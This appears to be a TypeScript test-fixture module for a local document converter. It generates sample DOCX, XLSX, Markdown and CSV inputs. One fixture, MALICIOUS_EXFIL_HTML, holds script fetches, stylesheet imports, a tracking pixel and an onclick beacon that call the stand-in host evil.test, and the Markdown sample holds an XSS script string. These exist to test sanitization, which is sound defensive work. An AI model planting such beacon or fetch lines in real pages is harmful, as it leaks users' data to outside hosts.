import JSZip from 'jszip';
import * as XLSX from 'xlsx';

export const TINY_PNG_BASE64 =
  'iVBORw0KGgoAAAANSUhEUgAAAAEAAAABCAQAAAC1HAwCAAAAC0lEQVR42mNk+A8AAQUBAScY42YAAAAASUVORK5CYII=';

export const TINY_PNG_DATA_URI = `data:image/png;base64,${TINY_PNG_BASE64}`;

export function base64ToUint8Array(base64: string): Uint8Array {
  const binary = atob(base64);
  const bytes = new Uint8Array(binary.length);
  for (let i = 0; i < binary.length; i++) {
    bytes[i] = binary.charCodeAt(i);
  }
  return bytes;
}

export interface SampleDocxOptions {
  includeImage?: boolean;
  corruptImage?: boolean;
}

export async function createSampleDocxBytes(
  options: SampleDocxOptions = {}
): Promise<Uint8Array> {
  const zip = new JSZip();

  zip.file(
    '[Content_Types].xml',
    `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Types xmlns="http://schemas.openxmlformats.org/package/2006/contenttypes">
  <Default Extension="rels" ContentType="application/vnd.openxmlformats-package.relationships+xml"/>
  <Default Extension="xml" ContentType="application/xml"/>
  <Default Extension="png" ContentType="image/png"/>
  <Override PartName="/word/document.xml" ContentType="application/vnd.openxmlformats-officedocument.wordprocessingml.document.main+xml"/>
</Types>`
  );

  zip.file(
    '_rels/.rels',
    `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  <Relationship Id="rId1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/officeDocument" Target="word/document.xml"/>
</Relationships>`
  );

  const imageRel = options.includeImage
    ? `<Relationship Id="rIdImg1" Type="http://schemas.openxmlformats.org/officeDocument/2006/relationships/image" Target="media/image1.png"/>`
    : '';

  zip.file(
    'word/_rels/document.xml.rels',
    `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<Relationships xmlns="http://schemas.openxmlformats.org/package/2006/relationships">
  ${imageRel}
</Relationships>`
  );

  const drawingXml = options.includeImage
    ? `<w:p>
        <w:r>
          <w:drawing>
            <wp:inline>
              <a:graphic>
                <a:graphicData>
                  <pic:pic>
                    <pic:blipFill>
                      <a:blip r:embed="rIdImg1"/>
                    </pic:blipFill>
                  </pic:pic>
                </a:graphicData>
              </a:graphic>
            </wp:inline>
          </w:drawing>
        </w:r>
      </w:p>`
    : '';

  zip.file(
    'word/document.xml',
    `<?xml version="1.0" encoding="UTF-8" standalone="yes"?>
<w:document
  xmlns:w="http://schemas.openxmlformats.org/wordprocessingml/2006/main"
  xmlns:r="http://schemas.openxmlformats.org/officeDocument/2006/relationships"
  xmlns:wp="http://schemas.openxmlformats.org/drawingml/2006/wordprocessingDrawing"
  xmlns:a="http://schemas.openxmlformats.org/drawingml/2006/main"
  xmlns:pic="http://schemas.openxmlformats.org/drawingml/2006/picture">
  <w:body>
    <w:p>
      <w:pPr><w:pStyle w:val="Heading1"/></w:pPr>
      <w:r><w:t>Quarterly Security Briefing</w:t></w:r>
    </w:p>
    <w:p>
      <w:r><w:t xml:space="preserve">All telemetry stays </w:t></w:r>
      <w:r><w:rPr><w:b/></w:rPr><w:t>strictly offline</w:t></w:r>
      <w:r><w:rPr><w:b w:val="0"/><w:i/></w:rPr><w:t xml:space="preserve"> inside browser memory.</w:t></w:r>
    </w:p>
    <w:p></w:p>
    <w:p>
      <w:pPr><w:numPr><w:ilvl w:val="0"/><w:numId w:val="1"/></w:numPr></w:pPr>
      <w:r><w:t>Zero cloud uploads performed</w:t></w:r>
    </w:p>
    <w:p>
      <w:pPr><w:numPr><w:ilvl w:val="0"/><w:numId w:val="1"/></w:numPr></w:pPr>
      <w:r><w:t>Verified vector PDF output</w:t></w:r>
    </w:p>
    <w:tbl>
      <w:tr>
        <w:tc><w:p><w:r><w:t>Module</w:t></w:r></w:p></w:tc>
        <w:tc><w:p><w:r><w:t>Status</w:t></w:r></w:p></w:tc>
      </w:tr>
      <w:tr>
        <w:tc><w:p><w:r><w:t>Sandbox Sanitizer</w:t></w:r></w:p></w:tc>
        <w:tc><w:p><w:r><w:t>Passed Local Audit</w:t></w:r></w:p></w:tc>
      </w:tr>
    </w:tbl>
    ${drawingXml}
  </w:body>
</w:document>`
  );

  if (options.includeImage) {
    zip.file(
      'word/media/image1.png',
      options.corruptImage
        ? new Uint8Array([0x00, 0x11, 0x22, 0x33])
        : base64ToUint8Array(TINY_PNG_BASE64)
    );
  }

  return zip.generateAsync({ type: 'uint8array' });
}

export function createMultiSheetXlsxBytes(
  rowCount = 50,
  wideSheetCols = 8
): Uint8Array {
  const wb = XLSX.utils.book_new();

  const ledgerData: unknown[][] = [['Entry ID', 'Account', 'Category', 'Amount USD']];
  for (let i = 1; i <= rowCount; i++) {
    ledgerData.push([
      `INV-${String(i).padStart(4, '0')}`,
      `Client Account #${i}`,
      i % 2 === 0 ? 'Operations' : 'Security Audit',
      `$${(i * 125.5).toFixed(2)}`,
    ]);
  }
  const ledgerSheet = XLSX.utils.aoa_to_sheet(ledgerData);
  XLSX.utils.book_append_sheet(wb, ledgerSheet, 'Ledger');

  const wideHeaders = Array.from({ length: wideSheetCols }, (_, idx) => `Metric ${idx + 1}`);
  const wideRows: unknown[][] = [wideHeaders];
  for (let r = 1; r <= 6; r++) {
    wideRows.push(
      Array.from({ length: wideSheetCols }, (_, c) => `R${r}C${c + 1}-DataValue`)
    );
  }
  const wideSheet = XLSX.utils.aoa_to_sheet(wideRows);
  XLSX.utils.book_append_sheet(wb, wideSheet, 'WideMatrix');

  const out = XLSX.write(wb, { type: 'array', bookType: 'xlsx' }) as ArrayBuffer;
  return new Uint8Array(out);
}

export const MALICIOUS_EXFIL_HTML = `<!doctype html>
<html>
<head>
  <title>Security Probe</title>
  <link rel="stylesheet" href="https://evil.test/a.css">
  <style>@import url("https://evil.test/theme.css"); body { color: #111; }</style>
</head>
<body>
  <h1>Privacy Containment Report</h1>
  <script>fetch('https://evil.test')</script>
  <img src="https://evil.test/pixel.gif" alt="Tracker">
  <div style="background-image: url('https://evil.test/bg.png')">
    <p>Sanitized paragraph content remains intact.</p>
  </div>
  <p><a href="javascript:alert(1)" onclick="fetch('https://evil.test/click')">Safe Link Text</a></p>
  <img src="data:image/svg+xml;base64,PHN2Zy8+" alt="Blocked SVG">
  <img src="${TINY_PNG_DATA_URI}" alt="Inline Pixel">
</body>
</html>`;

export const SAMPLE_MARKDOWN_DOC = `# Local Markdown Architecture Guide

PrivKnife converts **Markdown** documents with *zero server uploads*.

## Supported Elements

- Bullet point one with \`inline_code()\`
- Bullet point two with clean typography

1. Step one: Parse locally
2. Step two: Compile vector PDF

\`\`\`ts
// Literal script tag must render escaped, never executed:
const xss = "<script>alert('xss')</script>";
export function verifyLocalExecution(input: string): number {
  return input.length * 42;
}
\`\`\`

| Component | Purpose | Network Calls |
|---|---|---|
| Marked | Parse Markdown AST | 0 |
| DOMPurify | Block remote URLs | 0 |
| jsPDF | Vector PDF compile | 0 |
`;

export const SAMPLE_CSV_TEXT =
  '\uFEFFItem,Description,Quantity,Unit Price\n' +
  'Widget A,"Standard unit, sealed pack\nSecond line note",12,$19.50\n' +
  'Widget B,"Enterprise bundle",3,$120.00\n' +
  ',,,\n\n';
